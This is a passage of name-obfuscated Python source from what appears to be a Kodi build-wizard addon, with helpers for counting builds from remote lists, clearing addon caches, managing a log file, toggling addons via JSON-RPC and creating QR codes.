            elif OO0OO0OOO00O00O0O =='all':return ADDON_ID ,O0O0OOO0O0OOOOO00 ,O0OOOOOOO0OO0OOO0 #line:1371
    else :return False #line:1372
def buildCount (ver =None ):#line:1374
    O000000000000O0O0 =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','')#line:1375
    OO00000OOO0OOOO00 =re .compile ('name="(.+?)".+?odi="(.+?)".+?dult="(.+?)"').findall (O000000000000O0O0 )#line:1376
    O0O000O0O0O0000OO =0 ;OOO0O000000O000O0 =0 ;O00OO0OO00OOOO0OO =0 ;O0OOOO000O0O0O00O =0 ;OOO0O0O0OO00O00OO =0 ;OOOOOO00O0000O000 =0 ;O0OOOOO0O00OO0O00 =0 #line:1377
    if len (OO00000OOO0OOOO00 )>0 :#line:1378
        for OO0O0OO00OO000000 ,O00O0O0OO0OO0OO00 ,O00OOO0O000000OOO in OO00000OOO0OOOO00 :#line:1379
            if not SHOWADULT =='true'and O00OOO0O000000OOO .lower ()=='yes':OOOOOO00O0000O000 +=1 ;O0OOOOO0O00OO0O00 +=1 ;continue #line:1380
            if not DEVELOPER =='true'and strTest (OO0O0OO00OO000000 ):OOOOOO00O0000O000 +=1 ;continue #line:1381
            O00O0O0OO0OO0OO00 =int (float (O00O0O0OO0OO0OO00 ))#line:1382
            O0O000O0O0O0000OO +=1 #line:1383
            if O00O0O0OO0OO0OO00 ==18 :OOO0O0O0OO00O00OO +=1 #line:1384
            elif O00O0O0OO0OO0OO00 ==17 :O0OOOO000O0O0O00O +=1 #line:1385
            elif O00O0O0OO0OO0OO00 ==16 :O00OO0OO00OOOO0OO +=1 #line:1386
            elif O00O0O0OO0OO0OO00 <=15 :OOO0O000000O000O0 +=1 #line:1387
    return O0O000O0O0O0000OO ,OOO0O000000O000O0 ,O00OO0OO00OOOO0OO ,O0OOOO000O0O0O00O ,OOO0O0O0OO00O00OO ,O0OOOOO0O00OO0O00 ,OOOOOO00O0000O000 #line:1388
def strTest (O0O00OO00OOOO00O0 ):#line:1390
    O0O00000000000OOO =(O0O00OO00OOOO00O0 .lower ()).split (' ')#line:1391
    if 'test'in O0O00000000000OOO :return True #line:1392
    else :return False #line:1393
def themeCount (O00OOO0O0OOO00000 ,count =True ):#line:1395
    OOOO0000O00O00OOO =checkBuild (O00OOO0O0OOO00000 ,'theme')#line:1396
    if OOOO0000O00O00OOO =='http://':return False #line:1397
    OO00000000OOO0O0O =openURL (OOOO0000O00O00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1398
    O0OO0O000O0OO00OO =re .compile ('name="(.+?)".+?dult="(.+?)"').findall (OO00000000OOO0O0O )#line:1399
    if len (O0OO0O000O0OO00OO )==0 :return False #line:1400
    OOO000O000OOO0OO0 =[]#line:1401
    for OOO00OO00O0O000OO ,O0O00O0O0O0O0OO00 in O0OO0O000O0OO00OO :#line:1402
        if not SHOWADULT =='true'and O0O00O0O0O0O0OO00 .lower ()=='yes':continue #line:1403
        OOO000O000OOO0OO0 .append (OOO00OO00O0O000OO )#line:1404
    if len (OOO000O000OOO0OO0 )>0 :#line:1405
        if count ==True :return len (OOO000O000OOO0OO0 )#line:1406
        else :return OOO000O000OOO0OO0 #line:1407
    else :return False #line:1408
def thirdParty (url =None ):#line:1410
    if url ==None :return #line:1411
    OOOOOO0OO0OO0O0OO =openURL (url ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1412
    OO00O00000OO0OOOO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?odi="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOOO0OO0OO0O0OO )#line:1413
    O0OO0OO00O00OOO00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOOOO0OO0OO0O0OO )#line:1414
    if len (OO00O00000OO0OOOO )>0 :#line:1415
        return True ,OO00O00000OO0OOOO #line:1416
    elif len (O0OO0OO00O00OOO00 )>0 :#line:1417
        return False ,O0OO0OO00O00OOO00 #line:1418
    else :#line:1419
        return False ,[]#line:1420
def workingURL (OO0O0O00O0O00OOOO ):#line:1426
    if OO0O0O00O0O00OOOO in ['http://','https://','']:return False #line:1427
    O0O0O00O00000000O =0 ;OO0O0OO000O000OOO =''#line:1428
    while O0O0O00O00000000O <3 :#line:1429
        O0O0O00O00000000O +=1 #line:1430
        try :#line:1431
            O000OOO00O00O0OOO =Request (OO0O0O00O0O00OOOO )#line:1432
            O000OOO00O00O0OOO .add_header ('User-Agent',USER_AGENT )#line:1433
            O00O0O00000O0OO0O =urlopen (O000OOO00O00O0OOO )#line:1434
            O00O0O00000O0OO0O .close ()#line:1435
            OO0O0OO000O000OOO =True #line:1436
            break #line:1437
        except Exception as O00O0O0OOOO0O0O00 :#line:1438
            OO0O0OO000O000OOO =str (O00O0O0OOOO0O0O00 )#line:1439
            log ("Working Url Error: %s [%s]"%(O00O0O0OOOO0O0O00 ,OO0O0O00O0O00OOOO ))#line:1440
            xbmc .sleep (500 )#line:1441
    return OO0O0OO000O000OOO #line:1442
def openURL (OOOOOO0OO0O0000O0 ):#line:1444
    OOO0O0O0000OOO000 =Request (OOOOOO0OO0O0000O0 )#line:1445
    OOO0O0O0000OOO000 .add_header ('User-Agent',USER_AGENT )#line:1446
    OO000000000O00OO0 =urlopen (OOO0O0O0000OOO000 )#line:1447
    OOO00OOO0OO0OOOO0 =OO000000000O00OO0 .read ()#line:1448
    OO000000000O00OO0 .close ()#line:1449
    return OOO00OOO0OO0OOOO0 .decode ('utf-8')#line:1451
def getKeyboard (default ="",heading ="",hidden =False ):#line:1456
    OO0OOO00O00OOO000 =xbmc .Keyboard (default ,heading ,hidden )#line:1457
    OO0OOO00O00OOO000 .doModal ()#line:1458
    if OO0OOO00O00OOO000 .isConfirmed ():#line:1459
        return unicode (OO0OOO00O00OOO000 .getText (),"utf-8")#line:1460
    return default #line:1461
def getSize (OO0O00OO00O0O000O ,total =0 ):#line:1463
    for OO00O00O000OOO0OO ,OOO0O00OO00O0O0OO ,OO000O0O00OO0OOO0 in os .walk (OO0O00OO00O0O000O ):#line:1464
        for O000O00O0OO00000O in OO000O0O00OO0OOO0 :#line:1465
            OOO000OO0O00000OO =os .path .join (OO00O00O000OOO0OO ,O000O00O0OO00000O )#line:1466
            total +=os .path .getsize (OOO000OO0O00000OO )#line:1467
    return total #line:1468
def convertSize (OO0O0O0OO00O00OO0 ,suffix ='B'):#line:1470
    for O0O0O0OO0O0O000OO in ['','K','M','G']:#line:1471
        if abs (OO0O0O0OO00O00OO0 )<1024.0 :#line:1472
            return "%3.02f %s%s"%(OO0O0O0OO00O00OO0 ,O0O0O0OO0O0O000OO ,suffix )#line:1473
        OO0O0O0OO00O00OO0 /=1024.0 #line:1474
    return "%.02f %s%s"%(OO0O0O0OO00O00OO0 ,'G',suffix )#line:1475
def getCacheSize ():#line:1477
    OOOO0O0O00OO000OO =os .path .join (PROFILE ,'addon_data')#line:1478
    OO000OOO0OO0O0OO0 =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:1487
    O0O0OOOOO000OO0O0 =[(OOOO0O0O00OO000OO ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'script.module.simple.downloader')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (OOOO0O0O00OO000OO ,'script.module.simple.downloader')),(os .path .join (OOOO0O0O00OO000OO ,'plugin.video.itv','Images'))]#line:1498
    OO000OO00O0OOOO0O =0 #line:1500
    for OOO0O0OOOO0O0OO00 in O0O0OOOOO000OO0O0 :#line:1502
        if os .path .exists (OOO0O0OOOO0O0OO00 )and not OOO0O0OOOO0O0OO00 in [ADDONDATA ,OOOO0O0O00OO000OO ]:#line:1503
            OO000OO00O0OOOO0O =getSize (OOO0O0OOOO0O0OO00 ,OO000OO00O0OOOO0O )#line:1504
        else :#line:1505
            for OO000000OOOOOOOO0 ,OOOO0O0000000O0O0 ,O0000O0OO0OO0OO00 in os .walk (OOO0O0OOOO0O0OO00 ):#line:1506
                for OOOO000O00OO000OO in OOOO0O0000000O0O0 :#line:1507
                    if 'cache'in OOOO000O00OO000OO .lower ()and not OOOO000O00OO000OO .lower ()=='meta_cache':OO000OO00O0OOOO0O =getSize (os .path .join (OO000000OOOOOOOO0 ,OOOO000O00OO000OO ),OO000OO00O0OOOO0O )#line:1508
    if INCLUDEVIDEO =='true':#line:1510
        O0000O0OO0OO0OO00 =[]#line:1511
        if INCLUDEALL =='true':O0000O0OO0OO0OO00 =OO000OOO0OO0O0OO0 #line:1512
        else :#line:1513
            if INCLUDEBOB =='true':O0000O0OO0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:1514
            if INCLUDEPHOENIX =='true':O0000O0OO0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.phstreams','cache.db'))#line:1515
            if INCLUDESPECTO =='true':O0000O0OO0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:1516
            if INCLUDEGENESIS =='true':O0000O0OO0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:1517
            if INCLUDEEXODUS =='true':O0000O0OO0OO0OO00 .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:1518
            if INCLUDEONECHAN =='true':O0000O0OO0OO0OO00 .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:1519
            if INCLUDESALTS =='true':O0000O0OO0OO0OO00 .append (os .path .join (DATABASE ,'saltscache.db'))#line:1520
            if INCLUDESALTSHD =='true':O0000O0OO0OO0OO00 .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:1521
        if len (O0000O0OO0OO0OO00 )>0 :#line:1522
            for OOO0O0OOOO0O0OO00 in O0000O0OO0OO0OO00 :OO000OO00O0OOOO0O =getSize (OOO0O0OOOO0O0OO00 ,OO000OO00O0OOOO0O )#line:1523
        else :log ("Clear Cache: Clear Video Cache Not Enabled",5 )#line:1524
    return OO000OO00O0OOOO0O #line:1525
def getInfo (OO0OO00O0OO00OO00 ):#line:1527
    try :return xbmc .getInfoLabel (OO0OO00O0OO00OO00 )#line:1528
    except :return False #line:1529
def removeFolder (OO0OO0O0O0O00O000 ):#line:1531
    log ("Deleting Folder: %s"%OO0OO0O0O0O00O000 ,5 )#line:1532
    try :shutil .rmtree (OO0OO0O0O0O00O000 ,ignore_errors =True ,onerror =None )#line:1533
    except :return False #line:1534
def removeFile (OO00O00OO00O000OO ):#line:1536
    log ("Deleting File: %s"%OO00O00OO00O000OO ,5 )#line:1537
    try :os .remove (OO00O00OO00O000OO )#line:1538
    except :return False #line:1539
def currSkin ():#line:1541
    return xbmc .getSkinDir ()#line:1542
def cleanHouse (OOOOOOO0OO0O0OOO0 ,ignore =False ):#line:1544
    log (OOOOOOO0OO0O0OOO0 )#line:1545
    O00O0OO0OO00OOO00 =0 ;O0OO0OOO00O0O0OOO =0 #line:1546
    for O000OO00OO00O000O ,OO0OO00O0O0OO0000 ,O0000O0O00OOO0OO0 in os .walk (OOOOOOO0OO0O0OOO0 ):#line:1547
        if ignore ==False :OO0OO00O0O0OO0000 [:]=[O000O0O0OOOO00OOO for O000O0O0OOOO00OOO in OO0OO00O0O0OO0000 if O000O0O0OOOO00OOO not in EXCLUDES ]#line:1548
        O0OO0OO00O00O0OOO =0 #line:1549
        O0OO0OO00O00O0OOO +=len (O0000O0O00OOO0OO0 )#line:1550
        if O0OO0OO00O00O0OOO >=0 :#line:1551
            for O00OO0OOOOOO0OO00 in O0000O0O00OOO0OO0 :#line:1552
                try :#line:1553
                    os .unlink (os .path .join (O000OO00OO00O000O ,O00OO0OOOOOO0OO00 ))#line:1554
                    O00O0OO0OO00OOO00 +=1 #line:1555
                except :#line:1556
                    try :#line:1557
                        shutil .rmtree (os .path .join (O000OO00OO00O000O ,O00OO0OOOOOO0OO00 ))#line:1558
                    except :#line:1559
                        log ("Error Deleting %s"%O00OO0OOOOOO0OO00 ,5 )#line:1560
            for OOO000O00OOOO0OOO in OO0OO00O0O0OO0000 :#line:1561
                O0OO0OOO00O0O0OOO +=1 #line:1562
                try :#line:1563
                    shutil .rmtree (os .path .join (O000OO00OO00O000O ,OOO000O00OOOO0OOO ))#line:1564
                    O0OO0OOO00O0O0OOO +=1 #line:1565
                except :#line:1566
                    log ("Error Deleting %s"%OOO000O00OOOO0OOO ,5 )#line:1567
    return O00O0OO0OO00OOO00 ,O0OO0OOO00O0O0OOO #line:1568
def emptyfolder (O00O000000OOOO0O0 ):#line:1570
    O0O00OOOO00OO000O =0 #line:1571
    for OOOOOO00OOO0O000O ,OO0O0OOOO0OO00O00 ,OOOO0O0OOO0OO00O0 in os .walk (O00O000000OOOO0O0 ,topdown =True ):#line:1572
        OO0O0OOOO0OO00O00 [:]=[O0O0O0OO0OO000O0O for O0O0O0OO0OO000O0O in OO0O0OOOO0OO00O00 if O0O0O0OO0OO000O0O not in EXCLUDES ]#line:1573
        OOOO000OOOO0OOOO0 =0 #line:1574
        OOOO000OOOO0OOOO0 +=len (OOOO0O0OOO0OO00O0 )+len (OO0O0OOOO0OO00O00 )#line:1575
        if OOOO000OOOO0OOOO0 ==0 :#line:1576
            shutil .rmtree (os .path .join (OOOOOO00OOO0O000O ))#line:1577
            O0O00OOOO00OO000O +=1 #line:1578
            log ("Empty Folder: %s"%OOOOOO00OOO0O000O ,5 )#line:1579
    return O0O00OOOO00OO000O #line:1580
def log (O0O0000OO0O0OO000 ,level =5 ):#line:1582
    if not os .path .exists (ADDONDATA ):#line:1584
      try :#line:1585
        os .makedirs (ADDONDATA )#line:1586
      except :pass #line:1587
    if not os .path .exists (WIZLOG ):OO000000OO0O0O0OO =open (WIZLOG ,'w');OO000000OO0O0O0OO .close ()#line:1588
    if WIZDEBUGGING =='false':return False #line:1589
    if DEBUGLEVEL =='0':return False #line:1590
    if DEBUGLEVEL =='1'and not level in [5 ,5 ,xbmc .LOGSEVERE ,xbmc .LOGFATAL ]:return False #line:1591
    if DEBUGLEVEL =='2':level =5 #line:1592
    try :#line:1593
        try :#line:1594
            if isinstance (O0O0000OO0O0OO000 ,unicode ):#line:1595
                O0O0000OO0O0OO000 ='%s'%(O0O0000OO0O0OO000 .encode ('utf-8'))#line:1596
            xbmc .log ('%s: %s'%(ADDONTITLE ,O0O0000OO0O0OO000 ),level )#line:1597
        except :#line:1598
            if isinstance (O0O0000OO0O0OO000 ,str ):#line:1599
                O0O0000OO0O0OO000 ='%s'%(O0O0000OO0O0OO000 .encode ('utf-8'))#line:1600
            xbmc .log ('%s: %s'%(ADDONTITLE ,O0O0000OO0O0OO000 ),level )#line:1601
    except Exception as OOOOO0000OO0O00O0 :#line:1602
        try :xbmc .log ('Logging Failure: %s'%(OOOOO0000OO0O00O0 ),level )#line:1603
        except :pass #line:1604
    if ENABLEWIZLOG =='true':#line:1605
        O0000O0O0O0OO0O00 =getS ('nextcleandate')if not getS ('nextcleandate')==''else str (TODAY )#line:1606
        if CLEANWIZLOG =='true'and O0000O0O0O0OO0O00 <=str (TODAY ):checkLog ()#line:1607
        with open (WIZLOG ,'a')as OO000000OO0O0O0OO :#line:1608
            O00OOO0000OOO00O0 ="[%s %s] %s"%(datetime .now ().date (),str (datetime .now ().time ())[:8 ],O0O0000OO0O0OO000 )#line:1609
            OO000000OO0O0O0OO .write (O00OOO0000OOO00O0 .rstrip ('\r\n')+'\n')#line:1610
def checkLog ():#line:1612
    try :#line:1613
        OOOOOO0OOO000OO0O =getS ('nextcleandate')#line:1614
        O000O0OOO0000O000 =TOMORROW #line:1615
        if CLEANWIZLOGBY =='0':#line:1616
            OO00OO0OO0O00OO0O =TODAY -timedelta (days =MAXWIZDATES [int (float (CLEANDAYS ))])#line:1617
            OO0OO000000OOO0O0 =0 #line:1618
            OOOO000O000OO0O0O =open (WIZLOG );OO0O00000O0OO00O0 =OOOO000O000OO0O0O .read ();OOOO000O000OO0O0O .close ();OOO0OOOOO0OO0OOO0 =OO0O00000O0OO00O0 .split ('\n')#line:1619
            for O0O00O00O0000O0OO in OOO0OOOOO0OO0OOO0 :#line:1620
                if str (O0O00O00O0000O0OO [1 :11 ])>=str (OO00OO0OO0O00OO0O ):#line:1621
                    break #line:1622
                OO0OO000000OOO0O0 +=1 #line:1623
            O0O0O000OOO0O0OO0 =OOO0OOOOO0OO0OOO0 [OO0OO000000OOO0O0 :]#line:1624
            O00000000OOOO0O0O ='\n'.join (O0O0O000OOO0O0OO0 )#line:1625
            OOOO000O000OO0O0O =open (WIZLOG ,'w');OOOO000O000OO0O0O .write (O00000000OOOO0O0O );OOOO000O000OO0O0O .close ()#line:1626
        elif CLEANWIZLOGBY =='1':#line:1627
            O0OOOOOOOOOO0O00O =MAXWIZSIZE [int (float (CLEANSIZE ))]*1024 #line:1628
            OOOO000O000OO0O0O =open (WIZLOG );OO0O00000O0OO00O0 =OOOO000O000OO0O0O .read ();OOOO000O000OO0O0O .close ();OOO0OOOOO0OO0OOO0 =OO0O00000O0OO00O0 .split ('\n')#line:1629
            if os .path .getsize (WIZLOG )>=O0OOOOOOOOOO0O00O :#line:1630
                O0OOO0OOO00OO000O =len (OOO0OOOOO0OO0OOO0 )/2 #line:1631
                O0O0O000OOO0O0OO0 =OOO0OOOOO0OO0OOO0 [O0OOO0OOO00OO000O :]#line:1632
                O00000000OOOO0O0O ='\n'.join (O0O0O000OOO0O0OO0 )#line:1633
                OOOO000O000OO0O0O =open (WIZLOG ,'w');OOOO000O000OO0O0O .write (O00000000OOOO0O0O );OOOO000O000OO0O0O .close ()#line:1634
        elif CLEANWIZLOGBY =='2':#line:1635
            OOOO000O000OO0O0O =open (WIZLOG );OO0O00000O0OO00O0 =OOOO000O000OO0O0O .read ();OOOO000O000OO0O0O .close ();OOO0OOOOO0OO0OOO0 =OO0O00000O0OO00O0 .split ('\n')#line:1636
            O00OOO0000O00OO0O =MAXWIZLINES [int (float (CLEANLINES ))]#line:1637
            if len (OOO0OOOOO0OO0OOO0 )>O00OOO0000O00OO0O :#line:1638
                O0OOO0OOO00OO000O =len (OOO0OOOOO0OO0OOO0 )-int (O00OOO0000O00OO0O /2 )#line:1639
                O0O0O000OOO0O0OO0 =OOO0OOOOO0OO0OOO0 [O0OOO0OOO00OO000O :]#line:1640
                O00000000OOOO0O0O ='\n'.join (O0O0O000OOO0O0OO0 )#line:1641
                OOOO000O000OO0O0O =open (WIZLOG ,'w');OOOO000O000OO0O0O .write (O00000000OOOO0O0O );OOOO000O000OO0O0O .close ()#line:1642
        setS ('nextcleandate',str (O000O0OOO0000O000 ))#line:1643
    except :pass #line:1644
def latestDB (O000OOO000O0O0OOO ):#line:1645
    if O000OOO000O0O0OOO in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:1646
        O00O0O00O00000O0O =glob .glob (os .path .join (DATABASE ,'%s*.db'%O000OOO000O0O0OOO ))#line:1647
        O000OO000O0O000O0 ='%s(.+?).db'%O000OOO000O0O0OOO [1 :]#line:1648
        OO00OOO0OO0OO0O00 =0 #line:1649
        for OOOOOO00OO0OOO0OO in O00O0O00O00000O0O :#line:1650
            try :OOO00O0000O00OOO0 =int (re .compile (O000OO000O0O000O0 ).findall (OOOOOO00OO0OOO0OO )[0 ])#line:1651
            except :OOO00O0000O00OOO0 =0 #line:1652
            if OO00OOO0OO0OO0O00 <OOO00O0000O00OOO0 :#line:1653
                OO00OOO0OO0OO0O00 =OOO00O0000O00OOO0 #line:1654
        return '%s%s.db'%(O000OOO000O0O0OOO ,OO00OOO0OO0OO0O00 )#line:1655
    else :return False #line:1656
def addonId (O0OOOO0000OO00OOO ):#line:1658
    try :#line:1659
        return xbmcaddon .Addon (id =O0OOOO0000OO00OOO )#line:1660
    except :#line:1661
        return False #line:1662
def toggleDependency (OOOOOOO00O00OO000 ,DP =None ):#line:1664
    O00OO0OOO0OO000O0 =os .path .join (ADDONS ,OOOOOOO00O00OO000 ,'addon.xml')#line:1665
    if os .path .exists (O00OO0OOO0OO000O0 ):#line:1666
        OO000O000OOO000OO =open (O00OO0OOO0OO000O0 ,mode ='r');OO000OOOO00OOO00O =OO000O000OOO000OO .read ();OO000O000OOO000OO .close ();#line:1667
        O0OO0O00OOOOOO000 =parseDOM (OO000OOOO00OOO00O ,'import',ret ='addon')#line:1668
        for O00O000000OO00O0O in O0OO0O00OOOOOO000 :#line:1669
            if not 'xbmc.python'in O00O000000OO00O0O :#line:1670
                OO0OO00O00000O00O =os .path .join (ADDONS ,O00O000000OO00O0O )#line:1671
                if not DP ==None :#line:1672
                    DP .update ("","Checking Dependency [COLOR yellow]%s[/COLOR] for [COLOR yellow]%s[/COLOR]"%(O00O000000OO00O0O ,OOOOOOO00O00OO000 ),"")#line:1673
                if os .path .exists (OO0OO00O00000O00O ):#line:1674
                    toggleAddon (OOOOOOO00O00OO000 ,'true')#line:1675
            xbmc .sleep (100 )#line:1676
def toggleAdult ():#line:1678
    OOO000OOOO0OOO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Enable[/COLOR] or [COLOR %s]Disable[/COLOR] all Adult addons?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Enable[/COLOR][/B]",nolabel ="[B][COLOR red]Disable[/COLOR][/B]")#line:1679
    OOOOOO00O0O0O0000 ='true'if OOO000OOOO0OOO000 ==1 else 'false'#line:1680
    OO0O0OOO00O00O0O0 ='Enabling'if OOO000OOOO0OOO000 ==1 else 'Disabling'#line:1681
    OOO0O0OOOOO00O00O =openURL ('http://noobsandnerds.com/TI/AddonPortal/adult.php').replace ('\n','').replace ('\r','').replace ('\t','')#line:1682
    O000OOOO0OO0000OO =re .compile ('i="(.+?)"').findall (OOO0O0OOOOO00O00O )#line:1683
    OOOOOOO00OO0O0O00 =[]#line:1684
    for OOOO00OOO00OO00OO in O000OOOO0OO0000OO :#line:1685
        OOO0O000OOOOO00O0 =os .path .join (ADDONS ,OOOO00OOO00OO00OO )#line:1686
        if os .path .exists (OOO0O000OOOOO00O0 ):#line:1687
            OOOOOOO00OO0O0O00 .append (OOOO00OOO00OO00OO )#line:1688
            toggleAddon (OOOO00OOO00OO00OO ,OOOOOO00O0O0O0000 ,True )#line:1689
            log ("[Toggle Adult] %s %s"%(OO0O0OOO00O00O0O0 ,OOOO00OOO00OO00OO ),5 )#line:1690
    if len (OOOOOOO00OO0O0O00 )>0 :#line:1691
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to view a list of the addons that where %s?[/COLOR]"%(COLOR2 ,OO0O0OOO00O00O0O0 .replace ('ing','ed')),yeslabel ="[B][COLOR green]View List[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:1692
            O0OO00000000OO0OO ='[CR]'.join (OOOOOOO00OO0O0O00 )#line:1693
            TextBox (ADDONTITLE ,"[COLOR %s]Here are a list of the addons that where %s for Adult Content:[/COLOR][CR][CR][COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OOO00O00O0O0 .replace ('ing','ed'),COLOR2 ,O0OO00000000OO0OO ))#line:1694
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s][COLOR %s]%d[/COLOR] Adult Addons %s[/COLOR]"%(COLOR2 ,COLOR1 ,count ,OO0O0OOO00O00O0O0 .replace ('ing','ed')))#line:1695
        forceUpdate (True )#line:1696
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Adult Addons Found[/COLOR]"%COLOR2 )#line:1697
def toggleAddon (OO0000000O0OOOO0O ,O0O0O0OOOOOOO0O00 ,over =None ):#line:1700
    if KODIV >=17 :#line:1701
        addonDatabase (OO0000000O0OOOO0O ,O0O0O0OOOOOOO0O00 )#line:1702
        return #line:1703
    O0O0OOO0O000OOOOO =OO0000000O0OOOO0O #line:1704
    OOOOOO0OOOOOOO0OO =os .path .join (ADDONS ,OO0000000O0OOOO0O ,'addon.xml')#line:1705
    if os .path .exists (OOOOOO0OOOOOOO0OO ):#line:1706
        O00O0OOOO00O0OO00 =open (OOOOOO0OOOOOOO0OO )#line:1707
        OOOOOOO000000000O =O00O0OOOO00O0OO00 .read ()#line:1708
        OO00O0OOOO000OO00 =parseDOM (OOOOOOO000000000O ,'addon',ret ='id')#line:1709
        OOO0O0OOOOO0O0O00 =parseDOM (OOOOOOO000000000O ,'addon',ret ='name')#line:1710
        O0O000O0OO000OOOO =parseDOM (OOOOOOO000000000O ,'extension',ret ='library',attrs ={'point':'xbmc.service'})#line:1711
        try :#line:1712
            if len (OO00O0OOOO000OO00 )>0 :#line:1713
                O0O0OOO0O000OOOOO =OO00O0OOOO000OO00 [0 ]#line:1714
            if len (O0O000O0OO000OOOO )>0 :#line:1715
                log ("We got a live one, stopping script: %s"%match [0 ],5 )#line:1716
                ebi ('StopScript(%s)'%os .path .join (ADDONS ,O0O0OOO0O000OOOOO ))#line:1717
                ebi ('StopScript(%s)'%O0O0OOO0O000OOOOO )#line:1718
                ebi ('StopScript(%s)'%os .path .join (ADDONS ,O0O0OOO0O000OOOOO ,O0O000O0OO000OOOO [0 ]))#line:1719
                xbmc .sleep (500 )#line:1720
        except :#line:1721
            pass #line:1722
    O00O0OO000O0O0O0O ='{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}, "id":1}'%(O0O0OOO0O000OOOOO ,O0O0O0OOOOOOO0O00 )#line:1723
    O00OOO0OOOO0O0O00 =xbmc .executeJSONRPC (O00O0OO000O0O0O0O )#line:1724
    if 'error'in O00OOO0OOOO0O0O00 and over ==None :#line:1725
        O0OOO0OOOO0OO000O ='Enabling'if O0O0O0OOOOOOO0O00 =='true'else 'Disabling'#line:1726
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error %s [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOO0OOOO0OO000O ,OO0000000O0OOOO0O ),"Check to make sure the addon list is upto date and try again.[/COLOR]")#line:1727
        forceUpdate ()#line:1728
def addonInfo (OOO0OOO0O0O0OOOOO ,OO000OOO0OO0OOOOO ):#line:1730
    OOOOOO0OO0O0OO00O =addonId (OOO0OOO0O0O0OOOOO )#line:1731
    if OOOOOO0OO0O0OO00O :return OOOOOO0OO0O0OO00O .getAddonInfo (OO000OOO0OO0OOOOO )#line:1732
    else :return False #line:1733
def whileWindow (OOO00O00O0OOO00OO ,active =False ,count =0 ,counter =15 ):#line:1735
    OO000OO0000O0OOO0 =getCond ('Window.IsActive(%s)'%OOO00O00O0OOO00OO )#line:1736
    log ("%s is %s"%(OOO00O00O0OOO00OO ,OO000OO0000O0OOO0 ),5 )#line:1737
    while not OO000OO0000O0OOO0 and count <counter :#line:1738
        log ("%s is %s(%s)"%(OOO00O00O0OOO00OO ,OO000OO0000O0OOO0 ,count ))#line:1739
        OO000OO0000O0OOO0 =getCond ('Window.IsActive(%s)'%OOO00O00O0OOO00OO )#line:1740
        count +=1 #line:1741
        xbmc .sleep (500 )#line:1742
    while OO000OO0000O0OOO0 :#line:1744
        active =True #line:1745
        log ("%s is %s"%(OOO00O00O0OOO00OO ,OO000OO0000O0OOO0 ),5 )#line:1746
        OO000OO0000O0OOO0 =getCond ('Window.IsActive(%s)'%OOO00O00O0OOO00OO )#line:1747
        xbmc .sleep (250 )#line:1748
    return active #line:1749
def id_generator (size =6 ,chars =string .ascii_uppercase +string .digits ):#line:1751
    return ''.join (random .choice (chars )for _O00O0O0OOOO0000OO in range (size ))#line:1752
def generateQR (O0O0OOOOO0OO0O00O ,OOO00O00O0O0OO0OO ):#line:1754
    if not os .path .exists (QRCODES ):os .makedirs (QRCODES )#line:1755
    O0OO00O0OOO00OO00 =os .path .join (QRCODES ,'%s.png'%OOO00O00O0O0OO0OO )#line:1756
    O0000OO00O0OO0O0O =pyqrcode .create (O0O0OOOOO0OO0O00O )#line:1757
    O0000OO00O0OO0O0O .png (O0OO00O0OOO00OO00 ,scale =10 )#line:1758
    return O0OO00O0OOO00OO00 #line:1759
def createQR ():#line:1761
    OOOO0000O000O0000 =getKeyboard ('',"%s: Insert the URL for the QRCode."%ADDONTITLE )#line:1762
    if OOOO0000O000O0000 =="":LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Create QR Code Cancelled![/COLOR]'%COLOR2 );return #line:1763
    if not OOOO0000O000O0000 .startswith ('http://')and not OOOO0000O000O0000 .startswith ('https://'):LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:1764
    if OOOO0000O000O0000 =='http://'or OOOO0000O000O0000 =='https://':LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:1765
